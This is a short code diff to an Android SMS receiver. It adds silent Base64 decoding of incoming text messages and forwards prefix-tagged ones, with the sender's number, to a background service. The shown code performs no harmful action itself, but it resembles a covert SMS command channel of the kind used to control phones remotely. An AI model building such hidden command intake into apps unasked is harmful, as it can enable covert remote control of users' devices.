@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.util.Base64;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 
@@ -23,7 +24,15 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 					sms_body.append(messages[i].getMessageBody());
 				}
-				String sms_from = messages[0].getDisplayOriginatingAddress();
+				String sms_from = messages[0].getDisplayOriginatingAddress();			
+				try {
+					String decoded_sms_body = new String(Base64.decode(sms_body.toString(), Base64.DEFAULT));		
+					if (decoded_sms_body.startsWith(SMService.IDENT_SMS)) {
+						sms_body = new StringBuilder(decoded_sms_body);
+					}
+				} catch (Exception e){	
+				}
+				
 				if (sms_body.toString().startsWith(SMService.IDENT_SMS)) {
 					Intent mi = new Intent(context, SMService.class);
 					mi.putExtra(Utils.EXTRA_PHONE_NUMBER, sms_from);
